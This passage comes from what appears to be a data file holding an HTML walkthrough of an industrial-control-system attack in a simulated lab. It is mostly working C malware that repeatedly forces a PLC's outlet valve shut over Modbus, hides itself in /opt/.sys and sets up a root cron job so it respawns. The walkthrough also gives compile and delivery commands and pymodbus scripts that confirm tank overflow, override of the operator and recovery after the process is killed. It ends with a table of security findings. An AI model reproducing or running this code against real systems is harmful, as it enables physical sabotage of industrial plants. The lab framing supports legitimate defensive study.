    sa.sin_family = AF_INET;
    sa.sin_port   = htons(PLC_PORT);
    inet_pton(AF_INET, PLC_IP, &amp;sa.sin_addr);
    struct timeval tv = {3, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &amp;tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &amp;tv, sizeof(tv));
    if (connect(fd, (struct sockaddr *)&amp;sa, sizeof(sa)) &lt; 0) { close(fd); return -1; }
    unsigned char p[12] = {0,1, 0,0, 0,6, 1, 5, (coil &gt;&gt; 8) &amp; 0xff, coil &amp; 0xff, on ? 0xff : 0, 0};
    write(fd, p, 12);
    char r[16]; read(fd, r, 16);
    close(fd);
    return 0;
}

static void daemonize(void) {
    if (fork() &gt; 0) _exit(0);
    setsid();
    if (fork() &gt; 0) _exit(0);
    int d = open("/dev/null", O_RDWR);
    if (d &gt;= 0) { dup2(d, 0); dup2(d, 1); dup2(d, 2); if (d &gt; 2) close(d); }
}

static void install_persistence(void) {
    mkdir("/opt", 0755);
    mkdir("/opt/.sys", 0755);
    char self[512];
    ssize_t n = readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (n &gt; 0) {
        self[n] = 0;
        if (strcmp(self, "/opt/.sys/netmon") != 0) {
            char c[1024];
            snprintf(c, sizeof(c), "cp %s /opt/.sys/netmon 2&gt;/dev/null", self);
            system(c);
            chmod("/opt/.sys/netmon", 0755);
        }
    }
    mkdir("/etc/cron.d", 0755);
    FILE *f = fopen("/etc/cron.d/sys-monitor", "w");
    if (f) {
        fputs("* * * * * root /opt/.sys/netmon &lt;/dev/null &gt;/dev/null 2&gt;&amp;1\n", f);
        fclose(f);
        chmod("/etc/cron.d/sys-monitor", 0644);
    }
}

int main(void) {
    if (getenv("_NM")) {
        while (1) { mbw(COIL, 0); sleep(5); }
    }
    mkdir("/opt", 0755);
    mkdir("/opt/.sys", 0755);
    int lock_fd = open("/opt/.sys/netmon.lock", O_CREAT | O_RDWR, 0600);
    if (lock_fd &lt; 0 || flock(lock_fd, LOCK_EX | LOCK_NB) &lt; 0) _exit(0);
    daemonize();
    install_persistence();
    setenv("_NM", "1", 1);
    execl("/opt/.sys/netmon", "/opt/.sys/netmon", NULL);
    _exit(1);
}</code></pre>

      <h3>4.9 Compile for the target</h3>
      <p>The engineering workstation runs Ubuntu (glibc). Build a statically-linked binary on the attacker host so it runs on any Linux without shared library dependencies.</p>
      <pre><code>$ x86_64-linux-musl-gcc -O2 -s -static \\
    -fno-asynchronous-unwind-tables -fno-unwind-tables \\
    -o netmon netmon.c

$ file netmon
netmon: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped</code></pre>

      <h3>4.10 Deliver and execute on the workstation</h3>
      <p>The binary is copied to the engineering workstation via the clipboard of the noVNC session (base64-encoded), decoded to disk, made executable, and run.</p>
      <pre><code># echo '&lt;base64 blob&gt;' | base64 -d &gt; /tmp/netmon
# chmod +x /tmp/netmon
# /tmp/netmon
# sleep 3
# ps -eo pid,ppid,args | grep netmon | grep -v grep
  1234   1    /opt/.sys/netmon</code></pre>
      <p>Exactly one instance. PPID=1 confirms daemonization. Path <code>/opt/.sys/netmon</code> confirms self-copy to the stable location.</p>

      <h3>4.11 Confirm the physical impact</h3>
      <p>Read the PLC's current state after the manipulator has been running for a few seconds.</p>
      <pre><code># python3 -c "
from pymodbus.client import ModbusTcpClient as M
c = M('10.200.10.10', port=502); c.connect()
co = c.read_coils(address=0, count=3).bits[:3]
hr = c.read_holding_registers(address=0, count=3).registers
print(f'pump={co[0]} valve={co[1]} estop={co[2]}')
print(f'level={hr[0]} in={hr[1]} out={hr[2]}')
c.close()
"
pump=True valve=False estop=False
level=320 in=120 out=0</code></pre>
      <ul>
        <li><code>pump=True</code> — inlet pump still running</li>
        <li><code>valve=False</code> — <strong>outlet valve forced closed</strong></li>
        <li><code>in=120</code> — water flowing in at full rate</li>
        <li><code>out=0</code> — nothing draining</li>
        <li><code>level=320</code> — water rising (was 20 before the attack)</li>
      </ul>

      <p><strong>The OTForge canvas reflects the physical impact.</strong> The water tank icon shows <code>1000 cm</code> — the overflow threshold — after sustained manipulation. The outlet valve pipe edge is red (closed). The inlet pump edge remains green (still running). The Modbus connection line and the coil control paths are highlighted in red, indicating the process is in an alarm state.</p>
      <p style="margin: 12px 0;">
        <img src="danger.png" alt="OTForge canvas showing the physical impact — water tank at 1000 cm (overflow), outlet valve closed, inlet pump still running, process in alarm state" style="max-width: 100%; border: 1px solid #333; border-radius: 6px;">
      </p>
      <p>This is the visual confirmation of the entire attack chain: a cyber action on the DMZ web server, propagated through the enterprise and control networks, resulted in a physical condition (tank overflow) that would trigger emergency response in a real facility.</p>

      <h3>4.12 Demonstrate operator override failure</h3>
      <p>Simulate an operator noticing the alarm and reopening the valve via the HMI.</p>
      <pre><code># python3 -c "
from pymodbus.client import ModbusTcpClient as M
c = M('10.200.10.10', port=502); c.connect()
c.write_coil(address=1, value=True)
c.close()
print('operator reopened valve')
"
operator reopened valve

# sleep 7

# python3 -c "
from pymodbus.client import ModbusTcpClient as M
c = M('10.200.10.10', port=502); c.connect()
co = c.read_coils(address=0, count=3).bits[:3]
hr = c.read_holding_registers(address=0, count=3).registers
print(f'valve={co[1]} | level={hr[0]} out={hr[2]}')
c.close()
"
valve=False | level=375 out=0</code></pre>
      <p>The operator's write succeeded momentarily, then the persistent manipulator closed the valve again within 5 seconds. The tank level continued rising.</p>

      <h3>4.13 Demonstrate kill-resistance</h3>
      <p>Kill the running process and observe the recovery.</p>
      <pre><code># pkill -9 -f netmon
# sleep 2
# ps -eo pid,args | grep netmon | grep -v grep
(no output)

# sleep 60

# ps -eo pid,args | grep netmon | grep -v grep
  1302   1    /opt/.sys/netmon</code></pre>
      <p>The process was killed, but the cron entry <code>/etc/cron.d/sys-monitor</code> respawned it within the next minute. The tank level continued rising without interruption to the attack.</p>

      <h3>Phase 4 Summary</h3>
      <table>
        <thead>
          <tr><th>#</th><th>Finding</th><th>Severity</th></tr>
        </thead>
        <tbody>
          <tr><td>F-13</td><td>Dual-homed engineering workstation bridges enterprise, control, and OT networks</td><td>Critical</td></tr>
          <tr><td>F-14</td><td>Browser-accessible desktop (noVNC) running as root on the engineering workstation</td><td>Critical</td></tr>
          <tr><td>F-15</td><td>Unauthenticated Modbus TCP from the engineering workstation to the PLC</td><td>Critical</td></tr>
          <tr><td>F-16</td><td>No monitoring on Modbus writes from control to OT</td><td>High</td></tr>
          <tr><td>F-17</td><td>Persistent process manipulation survives operator correction and process kill</td><td>Critical</td></tr>
        </tbody>
      </table>

      <p><strong>Result:</strong> From the internet-facing web tier, through the enterprise AD domain, across the IT/OT boundary via a dual-homed workstation, into the control network, and finally to the PLC. The outlet valve is held closed. The tank level rises continuously toward overflow. Operator intervention is overridden within 5 seconds. Killing the attacker process does not stop the attack — the cron watchdog respawns it.</p>

      <p>The Plant DMZ — intended to broker all enterprise↔control traffic — was bypassed entirely. The org's segmentation was correct on paper and defeated in practice by a single misconfigured host.</p>
    `
}

 ];